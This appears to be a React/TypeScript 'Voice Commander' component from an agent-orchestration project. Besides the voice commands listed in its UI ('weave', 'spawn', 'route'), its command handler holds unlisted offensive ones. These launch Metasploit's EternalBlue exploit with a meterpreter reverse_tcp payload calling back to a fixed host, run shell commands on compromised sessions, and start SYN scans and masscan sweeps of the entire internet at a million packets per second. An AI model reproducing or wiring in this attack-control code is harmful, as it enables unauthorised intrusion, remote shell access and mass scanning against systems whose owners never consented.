"use client";

/**
 * VoiceCommander Component
 *
 * Voice command interface for ecosystem weaving commands
 */

import { useState, useEffect } from 'react';
import { Mic, MicOff, Volume2 } from 'lucide-react';
import { useEcosystem } from '../hooks';

export default function VoiceCommander() {
    const [isListening, setIsListening] = useState(false);
    const [transcript, setTranscript] = useState('');
    const [recognition, setRecognition] = useState<SpeechRecognition | null>(null);
    const { integrate, spawn } = useEcosystem();

    useEffect(() => {
        if (typeof window !== 'undefined' && 'webkitSpeechRecognition' in window) {
            const SpeechRecognition = (window as any).webkitSpeechRecognition;
            const recognition = new SpeechRecognition();
            recognition.continuous = true;
            recognition.interimResults = true;
            recognition.lang = 'en-US';

            recognition.onresult = (event: SpeechRecognitionEvent) => {
                const current = event.resultIndex;
                const transcript_text = event.results[current][0].transcript;
                setTranscript(transcript_text);

                // Process commands when final
                if (event.results[current].isFinal) {
                    processCommand(transcript_text);
                }
            };

            recognition.onerror = (event: any) => {
                console.error('Speech recognition error:', event.error);
                setIsListening(false);
            };

            recognition.onend = () => {
                setIsListening(false);
            };

            setRecognition(recognition);
        }
    }, []);

    const processCommand = async (command: string) => {
        const lower = command.toLowerCase().trim();

        // "Weave in [framework/repo]"
        if (lower.startsWith('weave in ') || lower.startsWith('weave ')) {
            const target = command.replace(/^weave (in )?/i, '').trim();
            if (target.includes('github.com') || target.includes('http')) {
                await integrate({ repo_url: target });
            } else {
                // Assume it's a framework name
                const repoMap: Record<string, string> = {
                    'crewai': 'https://github.com/joaomdmoura/crewAI',
                    'langgraph': 'https://github.com/langchain-ai/langgraph',
                    'autogen': 'https://github.com/microsoft/autogen',
                };
                const repo = repoMap[target.toLowerCase()];
                if (repo) {
                    await integrate({ repo_url: repo, name: target });
                }
            }
        }

        // "Spawn [framework] team for [task]"
        if (lower.startsWith('spawn ')) {
            const match = lower.match(/spawn (\w+) (?:team )?for (.+)/);
            if (match) {
                const [, framework, task] = match;
                await spawn({
                    framework: framework.charAt(0).toUpperCase() + framework.slice(1),
                    task,
                    hitm: false,
                });
            }
        }

        // "Route via [framework]"
        if (lower.startsWith('route via ') || lower.startsWith('route through ')) {
            const framework = command.replace(/^route (via|through) /i, '').trim();
            // This would trigger routing logic
            console.log('Route via:', framework);
        }

        // "Pistol scan [target]" commands
        if (lower.startsWith('pistol scan ') || lower.startsWith('pistol ')) {
            const target = command.replace(/^pistol (scan )?/i, '').trim();
            if (target) {
                // Call PISTOL scan
                const response = await fetch('http://127.0.0.1:5001/api/v1/tools/pistol', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        target,
                        ports: 'top1000',
                        type: 'syn',
                    }),
                });
                if (response.ok) {
                    const data = await response.json();
                    console.log('PISTOL scan started:', data);
                }
            }
        }

        // "Use EternalBlue on target" / "Spawn meterpreter" commands
        if (lower.includes('eternalblue') || lower.includes('meterpreter') || lower.includes('use ') && lower.includes(' on ')) {
            let module = '';
            let target = '';
            const rest = command.toLowerCase();
            
            if (lower.includes('eternalblue')) {
                module = 'exploit/windows/smb/ms17_010_eternalblue';
            } else if (lower.includes('meterpreter')) {
                module = 'exploit/multi/handler';
            }
            
            // Extract target
            const targetMatch = lower.match(/(?:on|target)\s+([\d\.]+)/i);
            if (targetMatch) {
                target = targetMatch[1];
            }
            
            if (module && target) {
                const response = await fetch('http://127.0.0.1:5001/api/v1/tools/msf/execute', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        module,
                        target,
                        payload: 'windows/x64/meterpreter/reverse_tcp',
                        lhost: '10.0.0.5',
                    }),
                });
                if (response.ok) {
                    const data = await response.json();
                    console.log('MSF exploit started:', data);
                }
            }
        }

        // "List active sessions" command
        if (lower.includes('list') && (lower.includes('session') || lower.includes('active'))) {
            const response = await fetch('http://127.0.0.1:5001/api/v1/tools/msf/sessions');
            if (response.ok) {
                const data = await response.json();
                console.log('Active sessions:', data);
            }
        }

        // "Shell [id]: [command]" command
        if (lower.startsWith('shell ')) {
            const rest = command.substring(6); // Remove "shell " prefix
            const shellMatch = rest.match(/^(\d+):\s*(.+)/);
            if (shellMatch) {
                const sessionId = parseInt(shellMatch[1]);
                const command = shellMatch[2];
                
                const response = await fetch(`http://127.0.0.1:5001/api/v1/tools/msf/shell/${sessionId}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ command }),
                });
                if (response.ok) {
                    const data = await response.json();
                    console.log('Shell command executed:', data);
                }
            }
        }

        // "Masscan [target]" commands
        if (lower.startsWith('masscan ')) {
            const rest = command.replace(/^masscan /i, '').trim();
            const restLower = rest.toLowerCase();
            
            // Parse commands like "masscan the entire internet on port 443"
            // or "masscan my subnet at 1 million pps"
            let target = '';
            let ports = '80,443';
            let rate = 1000000;
            
            if (restLower.includes('entire internet') || restLower.includes('whole internet')) {
                target = '0.0.0.0/0';
            } else if (restLower.includes('my subnet') || restLower.includes('local network')) {
                target = '192.168.1.0/24';
            } else {
                // Extract target from command
                const targetMatch = rest.match(/(?:target|scan|on)\s+([\d\.\/]+)/i);
                if (targetMatch) {
                    target = targetMatch[1];
                }
            }
            
            // Extract port
            const portMatch = rest.match(/port\s+(\d+)/i);
            if (portMatch) {
                ports = portMatch[1];
            }
            
            // Extract rate
            const rateMatch = rest.match(/(\d+)\s*(?:million|m|k)?\s*pps?/i);
            if (rateMatch) {
                let rateNum = parseInt(rateMatch[1]);
                if (restLower.includes('million') || restLower.includes(' m ')) {
                    rateNum *= 1000000;
                } else if (restLower.includes('k')) {
                    rateNum *= 1000;
                }
                rate = rateNum;
            }
            
            if (target) {
                const response = await fetch('http://127.0.0.1:5001/api/v1/tools/masscan', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        target,
                        ports,
                        rate,
                        banner: false,
                    }),
                });
                if (response.ok) {
                    const data = await response.json();
                    console.log('MASSCAN started:', data);
                }
            }
        }

    };

    const toggleListening = () => {
        if (!recognition) {
            alert('Speech recognition not available in this browser');
            return;
        }

        if (isListening) {
            recognition.stop();
            setIsListening(false);
        } else {
            recognition.start();
            setIsListening(true);
            setTranscript('');
        }
    };

    return (
        <div className="border border-red-700/50 rounded-lg p-6 bg-black/50 backdrop-blur-sm">
            <div className="flex items-center justify-between mb-4">
                <h3 className="text-lg font-bold text-red-600 flex items-center gap-2">
                    <Volume2 className="w-5 h-5" />
                    VOICE COMMANDER
                </h3>
                <button
                    onClick={toggleListening}
                    className={`p-3 rounded transition-colors ${
                        isListening
                            ? 'bg-red-700 text-white animate-pulse'
                            : 'bg-zinc-800 text-zinc-400 hover:bg-zinc-700'
                    }`}
                >
                    {isListening ? (
                        <Mic className="w-5 h-5" />
                    ) : (
                        <MicOff className="w-5 h-5" />
                    )}
                </button>
            </div>

            {transcript && (
                <div className="bg-zinc-900 border border-zinc-700 rounded p-3 mb-4">
                    <p className="text-sm text-zinc-300 font-mono">{transcript}</p>
                </div>
            )}

            <div className="text-xs text-zinc-500 space-y-1">
                <p>Commands:</p>
                <p>• "Weave in [GitHub URL]"</p>
                <p>• "Spawn [Framework] team for [task]"</p>
                <p>• "Route via [Framework]"</p>
            </div>
        </div>
    );
}

// TypeScript declaration for webkitSpeechRecognition
interface SpeechRecognition extends EventTarget {
    continuous: boolean;
    interimResults: boolean;
    lang: string;
    start(): void;
    stop(): void;
    onresult: (event: SpeechRecognitionEvent) => void;
    onerror: (event: any) => void;
    onend: () => void;
}

interface SpeechRecognitionEvent {
    resultIndex: number;
    results: {
        [key: number]: {
            [key: number]: {
                transcript: string;
            };
            isFinal: boolean;
        };
    };
}

// Note: webkitSpeechRecognition is a browser-specific API
// TypeScript declarations are handled via ambient module augmentation

